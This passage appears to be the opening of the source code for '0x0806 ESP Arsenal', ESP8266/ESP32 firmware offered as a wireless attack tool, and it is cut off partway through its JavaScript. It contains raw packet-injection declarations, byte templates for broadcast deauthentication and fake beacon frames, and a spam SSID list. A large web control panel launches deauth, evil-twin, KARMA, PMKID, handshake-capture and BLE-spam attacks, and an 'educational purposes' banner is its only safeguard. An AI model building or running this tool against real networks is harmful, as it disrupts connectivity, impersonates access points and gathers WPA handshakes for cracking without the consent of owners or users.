
/*
 * 0x0806 ESP Arsenal - Advanced WiFi & BLE Security Testing Platform
 * Developed by 0x0806
 * 
 * Universal ESP8266/ESP32 WiFi Security Testing Tool
 * Features: Dual-band WiFi attacks, BLE attacks, Modern UI
 * 
 * This software is for educational purposes only
 * Use responsibly and only on networks you own or have permission to test
 */

// Platform detection and includes
#ifdef ESP32
  #include <WiFi.h>
  #include <WebServer.h>
  #include <DNSServer.h>
  #include <SPIFFS.h>
  #include <esp_wifi.h>
  #include <esp_system.h>
  #include <esp_task_wdt.h>
  #include <nvs_flash.h>
  #include <BLEDevice.h>
  #include <BLEUtils.h>
  #include <BLEScan.h>
  #include <BLEAdvertisedDevice.h>
  #include <BLEBeacon.h>
  #include <BLEAdvertising.h>
  #define FILESYSTEM SPIFFS
  #define PLATFORM_ESP32
  WebServer server(80);
#else
  #include <ESP8266WiFi.h>
  #include <ESP8266WebServer.h>
  #include <DNSServer.h>
  #include <LittleFS.h>
  #define FILESYSTEM LittleFS
  #define PLATFORM_ESP8266
  ESP8266WebServer server(80);
  extern "C" {
    #include "user_interface.h"
    #include "osapi.h"
    typedef void (*freedom_outside_cb_t)(uint8_t status);
    int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
  }
#endif

#include <vector>
#include <algorithm>

// Configuration constants
#define TOOL_NAME "0x0806 ESP Arsenal"
#define VERSION "v7.0.0-Ultimate"
#define AP_SSID "0x0806-ESP-Arsenal"
#define AP_PASS "0x0806security"
#define MAX_NETWORKS 50
#define MAX_STATIONS 30
#define MAX_BLE_DEVICES 20

// Pin definitions
#define LED_PIN 2
#define BUTTON_PIN 0

// Global control variables
bool systemReady = false;
bool apStarted = false;
bool attacking = false;
bool scanning = false;
bool deauthActive = false;
bool beaconSpamActive = false;
bool probeAttackActive = false;
bool evilTwinActive = false;
bool handshakeCaptureActive = false;
bool karmaAttackActive = false;
bool pmkidAttackActive = false;
bool bleSpamActive = false;
bool captivePortalEnabled = true;
bool aggressiveMode = false;

// Network structures
struct WiFiNetwork {
  String ssid;
  String bssid;
  int channel;
  int rssi;
  String encryption;
  bool selected;
  bool hidden;
  uint8_t bssid_bytes[6];
};

struct Station {
  String mac;
  String ap_mac;
  int rssi;
  bool selected;
  uint8_t mac_bytes[6];
};

#ifdef PLATFORM_ESP32
struct BLETargetDevice {
  String name;
  String address;
  int rssi;
  bool selected;
  String manufacturer;
  String services;
};

std::vector<BLETargetDevice> bleDevices;
BLEScan* pBLEScan = nullptr;
BLEAdvertising* pAdvertising = nullptr;

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
      BLETargetDevice newDevice;
      newDevice.name = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "Unknown";
      newDevice.address = advertisedDevice.getAddress().toString().c_str();
      newDevice.rssi = advertisedDevice.getRSSI();
      newDevice.selected = false;
      newDevice.manufacturer = advertisedDevice.haveManufacturerData() ? "Yes" : "No";
      newDevice.services = advertisedDevice.haveServiceUUID() ? "Yes" : "No";
      
      bool exists = false;
      for(auto& device : bleDevices) {
        if(device.address == newDevice.address) {
          device.rssi = newDevice.rssi;
          exists = true;
          break;
        }
      }
      
      if(!exists && bleDevices.size() < MAX_BLE_DEVICES) {
        bleDevices.push_back(newDevice);
      }
    }
};
#endif

// Data containers
std::vector<WiFiNetwork> networks;
std::vector<Station> stations;
DNSServer dnsServer;

// Statistics tracking
struct AttackStats {
  unsigned long deauthPackets = 0;
  unsigned long beaconPackets = 0;
  unsigned long probePackets = 0;
  unsigned long blePackets = 0;
  unsigned long handshakes = 0;
  unsigned long startTime = 0;
  unsigned long totalPackets = 0;
} stats;

// Attack packet templates
uint8_t deauth_frame_default[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // bssid
  0x00, 0x00,  // sequence control
  0x07, 0x00   // reason code
};

uint8_t beacon_frame_default[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0xC0, 0x6C, 0x83, 0x1A, 0xF7, 0x8C, 0x7E, 0x00,
  0x00, 0x00, 0x64, 0x00, 0x11, 0x04, 0x00, 0x08,
  0x46, 0x52, 0x45, 0x45, 0x57, 0x49, 0x46, 0x49,
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30,
  0x48, 0x6C, 0x03, 0x01, 0x04, 0x00
};

// Fake SSID list for beacon spam
const char* fake_ssids[] = {
  "FREE_WIFI_CLICK_HERE", "FBI_SURVEILLANCE_VAN", "NSA_MONITORING_POST",
  "POLICE_SURVEILLANCE", "VIRUS_INFECTED_WIFI", "MALWARE_DOWNLOAD_HERE",
  "0x0806-PWNED-NETWORK", "HACKED_BY_0x0806", "SECURITY_BREACH_ALERT",
  "BACKDOOR_ACCESS_POINT", "COMPROMISED_ROUTER", "TROJAN_WIFI_NETWORK",
  "FREE_INTERNET_SCAM", "PHISHING_HOTSPOT", "IDENTITY_THEFT_WIFI",
  "CREDIT_CARD_STEALER", "PASSWORD_HARVESTER", "DATA_MINING_NETWORK"
};

// Modern professional web interface
const char MAIN_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0x0806 ESP Arsenal - Professional Security Platform</title>
    <style>
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #1a1a2e;
            --bg-tertiary: #16213e;
            --accent-green: #00ff41;
            --accent-red: #ff0041;
            --accent-orange: #ff8c00;
            --text-primary: #ffffff;
            --text-secondary: #b0b0b0;
            --border-color: #333;
            --shadow-glow: 0 0 20px rgba(0, 255, 65, 0.3);
            --shadow-red: 0 0 20px rgba(255, 0, 65, 0.3);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', 'Monaco', 'Menlo', monospace;
            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 50%, var(--bg-tertiary) 100%);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 255, 65, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 65, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 50% 50%, rgba(255, 140, 0, 0.03) 0%, transparent 50%);
            z-index: -1;
            animation: pulse 8s ease-in-out infinite alternate;
        }

        @keyframes pulse {
            0% { opacity: 0.3; }
            100% { opacity: 0.7; }
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
            opacity: 0.1;
        }

        .matrix-bg::before {
            content: '0101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101';
            position: absolute;
            top: -200%;
            left: 0;
            right: 0;
            font-size: 14px;
            color: var(--accent-green);
            white-space: pre-wrap;
            word-break: break-all;
            animation: matrix-fall 15s linear infinite;
            line-height: 1.2;
        }

        @keyframes matrix-fall {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100vh); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 1rem;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
            background: rgba(26, 26, 46, 0.8);
            border: 2px solid var(--accent-green);
            border-radius: 20px;
            padding: 2.5rem;
            backdrop-filter: blur(15px);
            box-shadow: var(--shadow-glow);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
            animation: scan-line 4s infinite;
        }

        @keyframes scan-line {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .logo {
            font-size: 3.5rem;
            font-weight: bold;
            color: var(--accent-green);
            text-shadow: 0 0 30px var(--accent-green);
            margin-bottom: 0.5rem;
            letter-spacing: 3px;
            animation: glow-pulse 3s ease-in-out infinite alternate;
        }

        @keyframes glow-pulse {
            0% { text-shadow: 0 0 20px var(--accent-green); }
            100% { text-shadow: 0 0 40px var(--accent-green), 0 0 60px var(--accent-green); }
        }

        .subtitle {
            color: var(--text-secondary);
            font-size: 1.3rem;
            margin-bottom: 1rem;
            font-weight: 300;
        }

        .version-badge {
            display: inline-block;
            background: linear-gradient(45deg, var(--accent-green), var(--accent-orange));
            color: var(--bg-primary);
            padding: 0.8rem 1.5rem;
            border-radius: 30px;
            font-weight: bold;
            font-size: 1.1rem;
            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.4);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .platform-info {
            margin-top: 1rem;
            display: flex;
            justify-content: center;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .platform-chip {
            background: rgba(0, 255, 65, 0.1);
            border: 1px solid var(--accent-green);
            border-radius: 20px;
            padding: 0.5rem 1rem;
            font-size: 0.9rem;
            color: var(--accent-green);
        }

        .nav-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .nav-btn {
            background: rgba(26, 26, 46, 0.8);
            border: 2px solid var(--border-color);
            color: var(--text-primary);
            padding: 1.5rem;
            border-radius: 15px;
            cursor: pointer;
            transition: var(--transition);
            font-family: inherit;
            font-size: 1.1rem;
            font-weight: bold;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .nav-btn:hover {
            border-color: var(--accent-green);
            box-shadow: var(--shadow-glow);
            transform: translateY(-5px);
            background: rgba(0, 255, 65, 0.1);
        }

        .nav-btn.active {
            border-color: var(--accent-green);
            box-shadow: var(--shadow-glow);
            background: rgba(0, 255, 65, 0.15);
        }

        .nav-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
            transition: left 0.6s ease;
        }

        .nav-btn:hover::before {
            left: 100%;
        }

        .tab-content {
            display: none;
            animation: fadeInUp 0.6s ease;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeInUp {
            from { 
                opacity: 0; 
                transform: translateY(30px);
            }
            to { 
                opacity: 1; 
                transform: translateY(0);
            }
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .card {
            background: rgba(26, 26, 46, 0.8);
            border: 2px solid var(--border-color);
            border-radius: 20px;
            padding: 2rem;
            backdrop-filter: blur(15px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .card:hover {
            border-color: var(--accent-green);
            transform: translateY(-8px);
            box-shadow: var(--shadow-glow);
        }

        .card-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 1.5rem;
            color: var(--accent-green);
            display: flex;
            align-items: center;
            gap: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .card-title::before {
            content: '▶';
            color: var(--accent-green);
            font-size: 1.2rem;
        }

        .btn {
            background: linear-gradient(45deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 65, 0.1));
            border: 2px solid var(--accent-green);
            color: var(--text-primary);
            padding: 1rem 1.8rem;
            border-radius: 12px;
            cursor: pointer;
            font-family: inherit;
            font-size: 1rem;
            font-weight: bold;
            margin: 0.5rem;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn:hover {
            background: var(--accent-green);
            color: var(--bg-primary);
            transform: scale(1.05);
            box-shadow: var(--shadow-glow);
        }

        .btn-danger {
            border-color: var(--accent-red);
            background: linear-gradient(45deg, rgba(255, 0, 65, 0.2), rgba(255, 0, 65, 0.1));
        }

        .btn-danger:hover {
            background: var(--accent-red);
            color: white;
            box-shadow: var(--shadow-red);
        }

        .btn-warning {
            border-color: var(--accent-orange);
            background: linear-gradient(45deg, rgba(255, 140, 0, 0.2), rgba(255, 140, 0, 0.1));
        }

        .btn-warning:hover {
            background: var(--accent-orange);
            color: var(--bg-primary);
            box-shadow: 0 0 20px rgba(255, 140, 0, 0.4);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .status-panel {
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .status-idle {
            border-color: var(--accent-green);
            background: rgba(0, 255, 65, 0.1);
        }

        .status-active {
            border-color: var(--accent-orange);
            background: rgba(255, 140, 0, 0.1);
        }

        .status-attacking {
            border-color: var(--accent-red);
            background: rgba(255, 0, 65, 0.1);
            animation: attack-pulse 1.5s infinite;
        }

        @keyframes attack-pulse {
            0%, 100% { 
                box-shadow: 0 0 10px var(--accent-red);
                opacity: 0.8;
            }
            50% { 
                box-shadow: 0 0 30px var(--accent-red);
                opacity: 1;
            }
        }

        .network-list {
            max-height: 500px;
            overflow-y: auto;
            border: 2px solid var(--border-color);
            border-radius: 15px;
            background: rgba(0, 0, 0, 0.4);
            margin-top: 1rem;
        }

        .network-list::-webkit-scrollbar {
            width: 12px;
        }

        .network-list::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
        }

        .network-list::-webkit-scrollbar-thumb {
            background: var(--accent-green);
            border-radius: 6px;
        }

        .network-item {
            display: flex;
            align-items: center;
            padding: 1.2rem;
            border-bottom: 1px solid var(--border-color);
            transition: var(--transition);
            cursor: pointer;
        }

        .network-item:hover {
            background: rgba(0, 255, 65, 0.1);
            border-left: 5px solid var(--accent-green);
        }

        .network-item.selected {
            background: rgba(0, 255, 65, 0.2);
            border-left: 5px solid var(--accent-green);
        }

        .network-info {
            flex: 1;
            margin-left: 1rem;
        }

        .network-ssid {
            font-weight: bold;
            color: var(--text-primary);
            font-size: 1.2rem;
            margin-bottom: 0.3rem;
        }

        .network-details {
            font-size: 0.95rem;
            color: var(--text-secondary);
        }

        .signal-strength {
            width: 100px;
            text-align: right;
            font-weight: bold;
            font-size: 1.1rem;
        }

        .signal-strong { color: var(--accent-green); }
        .signal-medium { color: var(--accent-orange); }
        .signal-weak { color: var(--accent-red); }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 1.5rem;
            margin: 1.5rem 0;
        }

        .stat-card {
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 1.5rem;
            text-align: center;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .stat-card:hover {
            border-color: var(--accent-green);
            transform: scale(1.05);
            box-shadow: var(--shadow-glow);
        }

        .stat-value {
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--accent-green);
            text-shadow: 0 0 15px var(--accent-green);
            margin-bottom: 0.5rem;
        }

        .stat-label {
            font-size: 1rem;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group {
            margin: 1rem 0;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--accent-green);
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-group input, 
        .input-group select {
            width: 100%;
            padding: 1rem;
            border: 2px solid var(--border-color);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.6);
            color: var(--text-primary);
            font-family: inherit;
            font-size: 1rem;
            transition: var(--transition);
        }

        .input-group input:focus, 
        .input-group select:focus {
            outline: none;
            border-color: var(--accent-green);
            box-shadow: var(--shadow-glow);
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 0.8rem;
            margin: 1rem 0;
        }

        .checkbox {
            width: 20px;
            height: 20px;
            accent-color: var(--accent-green);
        }

        .badge {
            display: inline-block;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.8rem;
            font-weight: bold;
            margin-left: 0.5rem;
            text-transform: uppercase;
        }

        .badge-open { 
            background: var(--accent-green); 
            color: var(--bg-primary); 
        }

        .badge-wpa { 
            background: var(--accent-red); 
            color: white; 
        }

        .badge-hidden { 
            background: var(--accent-orange); 
            color: var(--bg-primary); 
        }

        .footer {
            text-align: center;
            padding: 2rem;
            background: rgba(26, 26, 46, 0.8);
            border: 2px solid var(--accent-green);
            border-radius: 20px;
            margin-top: 3rem;
            backdrop-filter: blur(15px);
        }

        .loading-spinner {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(0, 255, 65, 0.3);
            border-radius: 50%;
            border-top-color: var(--accent-green);
            animation: spin 1s linear infinite;
            margin-right: 0.5rem;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .warning-banner {
            background: linear-gradient(45deg, var(--accent-red), #cc0000);
            color: white;
            padding: 1.5rem;
            border-radius: 15px;
            margin-bottom: 2rem;
            text-align: center;
            font-weight: bold;
            font-size: 1.1rem;
            animation: warning-pulse 3s infinite;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        @keyframes warning-pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }

        @media (max-width: 768px) {
            .container { padding: 0.5rem; }
            .grid { grid-template-columns: 1fr; }
            .nav-grid { grid-template-columns: repeat(2, 1fr); }
            .logo { font-size: 2.5rem; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .card { padding: 1.5rem; }
        }

        @media (max-width: 480px) {
            .nav-grid { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: 1fr; }
            .platform-info { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">0x0806 ESP ARSENAL</div>
            <div class="subtitle">Advanced WiFi & BLE Security Testing Platform</div>
            <div class="version-badge">v7.0.0-Ultimate</div>
            <div class="platform-info">
                <div class="platform-chip" id="platformInfo">Loading Platform...</div>
                <div class="platform-chip" id="memoryInfo">Memory: Loading...</div>
                <div class="platform-chip" id="uptimeInfo">Uptime: Loading...</div>
            </div>
        </div>

        <div class="warning-banner">
            WARNING: FOR EDUCATIONAL PURPOSES ONLY - USE RESPONSIBLY ON AUTHORIZED NETWORKS
        </div>

        <div class="nav-grid">
            <button class="nav-btn active" onclick="showTab('scanner')">WiFi Scanner</button>
            <button class="nav-btn" onclick="showTab('attacks')">WiFi Attacks</button>
            <button class="nav-btn" onclick="showTab('advanced')">Advanced</button>
            <button class="nav-btn" onclick="showTab('ble')" id="bleTab" style="display:none;">BLE Security</button>
            <button class="nav-btn" onclick="showTab('monitor')">Monitor</button>
            <button class="nav-btn" onclick="showTab('settings')">Settings</button>
        </div>

        <!-- WiFi Scanner Tab -->
        <div id="scanner" class="tab-content active">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Network Scanner</div>
                    <div id="scanStatus" class="status-panel status-idle">System Ready - Click Scan to Begin</div>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-value" id="networkCount">0</div>
                            <div class="stat-label">Networks Found</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value" id="selectedCount">0</div>
                            <div class="stat-label">Selected</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value" id="channelRange">1-13</div>
                            <div class="stat-label">Channel Range</div>
                        </div>
                    </div>

                    <button onclick="startWiFiScan()" class="btn" id="scanBtn">Start WiFi Scan</button>
                    <button onclick="stopWiFiScan()" class="btn btn-warning" id="stopScanBtn">Stop Scan</button>
                    <button onclick="clearNetworks()" class="btn btn-danger">Clear Results</button>
                </div>

                <div class="card">
                    <div class="card-title">Selection Controls</div>
                    <button onclick="selectAllNetworks()" class="btn">Select All</button>
                    <button onclick="selectNoneNetworks()" class="btn btn-warning">Clear Selection</button>
                    <button onclick="selectOpenNetworks()" class="btn btn-danger">Open Networks Only</button>
                    <button onclick="selectStrongSignal()" class="btn">Strong Signal Only</button>
                </div>
            </div>

            <div class="card">
                <div class="card-title">Discovered Networks</div>
                <div id="networkList" class="network-list">
                    <div style="padding: 3rem; text-align: center; color: var(--text-secondary); font-size: 1.2rem;">
                        Click "Start WiFi Scan" to discover available networks
                    </div>
                </div>
            </div>
        </div>

        <!-- WiFi Attacks Tab -->
        <div id="attacks" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Deauthentication Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Disconnect clients from selected access points using deauth frames.
                    </p>
                    <div class="checkbox-container">
                        <input type="checkbox" class="checkbox" id="aggressiveDeauth">
                        <label>Aggressive Mode (Higher packet rate)</label>
                    </div>
                    <button onclick="startDeauthAttack()" class="btn btn-danger" id="deauthBtn">Launch Deauth Attack</button>
                    <button onclick="stopDeauthAttack()" class="btn" id="stopDeauthBtn">Stop Deauth</button>
                    <div class="stat-card" style="margin-top: 1rem;">
                        <div class="stat-value" id="deauthCount">0</div>
                        <div class="stat-label">Deauth Packets Sent</div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title">Beacon Spam Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Flood the area with fake access points to confuse devices.
                    </p>
                    <button onclick="startBeaconSpam()" class="btn btn-danger" id="beaconBtn">Start Beacon Spam</button>
                    <button onclick="stopBeaconSpam()" class="btn" id="stopBeaconBtn">Stop Beacon Spam</button>
                    <div class="stat-card" style="margin-top: 1rem;">
                        <div class="stat-value" id="beaconCount">0</div>
                        <div class="stat-label">Beacon Packets Sent</div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title">Evil Twin Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Create malicious access points mimicking legitimate networks.
                    </p>
                    <button onclick="startEvilTwin()" class="btn btn-danger" id="evilTwinBtn">Deploy Evil Twin</button>
                    <button onclick="stopEvilTwin()" class="btn" id="stopEvilTwinBtn">Stop Evil Twin</button>
                </div>

                <div class="card">
                    <div class="card-title">Probe Request Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Capture and analyze device probe requests for reconnaissance.
                    </p>
                    <button onclick="startProbeAttack()" class="btn btn-warning" id="probeBtn">Start Probe Attack</button>
                    <button onclick="stopProbeAttack()" class="btn" id="stopProbeBtn">Stop Probe Attack</button>
                    <div class="stat-card" style="margin-top: 1rem;">
                        <div class="stat-value" id="probeCount">0</div>
                        <div class="stat-label">Probe Packets Sent</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Advanced Tab -->
        <div id="advanced" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Handshake Capture</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Capture WPA/WPA2 handshakes for offline analysis.
                    </p>
                    <button onclick="startHandshakeCapture()" class="btn" id="handshakeBtn">Start Handshake Capture</button>
                    <button onclick="stopHandshakeCapture()" class="btn btn-warning" id="stopHandshakeBtn">Stop Capture</button>
                    <div class="stat-card" style="margin-top: 1rem;">
                        <div class="stat-value" id="handshakeCount">0</div>
                        <div class="stat-label">Handshakes Captured</div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title">KARMA Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Respond to all probe requests to capture connecting devices.
                    </p>
                    <button onclick="startKarmaAttack()" class="btn btn-danger" id="karmaBtn">Launch KARMA Attack</button>
                    <button onclick="stopKarmaAttack()" class="btn" id="stopKarmaBtn">Stop KARMA</button>
                </div>

                <div class="card">
                    <div class="card-title">PMKID Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Capture PMKID for WPA/WPA2 offline attacks.
                    </p>
                    <button onclick="startPMKIDAttack()" class="btn btn-warning" id="pmkidBtn">Start PMKID Attack</button>
                    <button onclick="stopPMKIDAttack()" class="btn" id="stopPMKIDBtn">Stop PMKID</button>
                </div>

                <div class="card">
                    <div class="card-title">Emergency Stop</div>
                    <p style="margin-bottom: 1rem; color: var(--accent-red);">
                        Immediately stop all active attacks.
                    </p>
                    <button onclick="emergencyStop()" class="btn btn-danger">EMERGENCY STOP ALL ATTACKS</button>
                </div>
            </div>
        </div>

        <!-- BLE Security Tab -->
        <div id="ble" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">BLE Device Scanner</div>
                    <div id="bleStatus" class="status-panel status-idle">BLE Scanner Ready</div>
                    <button onclick="startBLEScan()" class="btn" id="bleScanBtn">Scan BLE Devices</button>
                    <button onclick="stopBLEScan()" class="btn btn-warning" id="stopBLEScanBtn">Stop BLE Scan</button>
                    <div class="stat-card" style="margin-top: 1rem;">
                        <div class="stat-value" id="bleDeviceCount">0</div>
                        <div class="stat-label">BLE Devices Found</div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title">BLE Spam Attack</div>
                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
                        Flood BLE spectrum with fake advertisements.
                    </p>
                    <button onclick="startBLESpam()" class="btn btn-danger" id="bleSpamBtn">Start BLE Spam</button>
                    <button onclick="stopBLESpam()" class="btn" id="stopBLESpamBtn">Stop BLE Spam</button>
                    <div class="stat-card" style="margin-top: 1rem;">
                        <div class="stat-value" id="bleSpamCount">0</div>
                        <div class="stat-label">BLE Packets Sent</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-title">Discovered BLE Devices</div>
                <div id="bleDeviceList" class="network-list">
                    <div style="padding: 3rem; text-align: center; color: var(--text-secondary); font-size: 1.2rem;">
                        BLE functionality requires ESP32 platform
                    </div>
                </div>
            </div>
        </div>

        <!-- Monitor Tab -->
        <div id="monitor" class="tab-content">
            <div class="card">
                <div class="card-title">Real-time Attack Monitor</div>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value" id="totalPacketsSent">0</div>
                        <div class="stat-label">Total Packets Sent</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="attackRuntime">00:00</div>
                        <div class="stat-label">Attack Runtime</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="targetNetworks">0</div>
                        <div class="stat-label">Target Networks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="packetsPerSecond">0</div>
                        <div class="stat-label">Packets/Second</div>
                    </div>
                </div>
                
                <div id="attackStatus" class="status-panel status-idle">No attacks running</div>
                
                <button onclick="refreshStats()" class="btn">Refresh Statistics</button>
                <button onclick="resetAllStats()" class="btn btn-warning">Reset All Statistics</button>
            </div>
        </div>

        <!-- Settings Tab -->
        <div id="settings" class="tab-content">
            <div class="grid">
                <div class="card">
                    <div class="card-title">Attack Configuration</div>
                    
                    <div class="input-group">
                        <label for="attackDelay">Attack Delay (ms):</label>
                        <input type="number" id="attackDelay" value="100" min="10" max="5000">
                    </div>
                    
                    <div class="input-group">
                        <label for="maxChannels">WiFi Channels to Scan:</label>
                        <input type="text" id="maxChannels" value="1,6,11" placeholder="1,2,3,4,5,6,7,8,9,10,11,12,13">
                    </div>
                    
                    <div class="checkbox-container">
                        <input type="checkbox" class="checkbox" id="stealthMode">
                        <label>Enable Stealth Mode</label>
                    </div>
                    
                    <div class="checkbox-container">
                        <input type="checkbox" class="checkbox" id="captivePortalSetting" checked>
                        <label>Enable Captive Portal</label>
                    </div>
                    
                    <button onclick="saveSettings()" class="btn">Save Configuration</button>
                    <button onclick="resetSettings()" class="btn btn-warning">Reset to Defaults</button>
                </div>

                <div class="card">
                    <div class="card-title">System Control</div>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-value" id="freeHeapMem">0</div>
                            <div class="stat-label">Free Memory (KB)</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value" id="systemUptime">0</div>
                            <div class="stat-label">Uptime (mins)</div>
                        </div>
                    </div>
                    
                    <button onclick="rebootDevice()" class="btn btn-warning">Reboot Device</button>
                    <button onclick="factoryReset()" class="btn btn-danger">Factory Reset</button>
                </div>
            </div>
        </div>

        <div class="footer">
            <h3 style="color: var(--accent-green); margin-bottom: 1rem;">0x0806 ESP Arsenal v7.0.0-Ultimate</h3>
            <p style="margin-bottom: 0.5rem;">Advanced WiFi & BLE Security Testing Platform</p>
            <p style="margin-bottom: 0.5rem;">Developed by 0x0806 Security Research</p>
            <p style="color: var(--accent-red); font-weight: bold;">For Educational and Authorized Testing Only</p>
        </div>
    </div>

    <script>
        // Global variables
        let currentPlatform = 'unknown';
        let isScanning = false;
        let isAttacking = false;
        let networks = [];
        let selectedNetworks = [];
        let attackStartTime = 0;
        let statsInterval;

        // Initialize the application
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
            startAutoRefresh();
        });

        function initializeApp() {
            console.log('Initializing 0x0806 ESP Arsenal...');
            detectPlatform();
            loadSystemInfo();
            updateAllStats();
        }

        function detectPlatform() {
            fetch('/api/platform')
                .then(response => response.json())
                .then(data => {
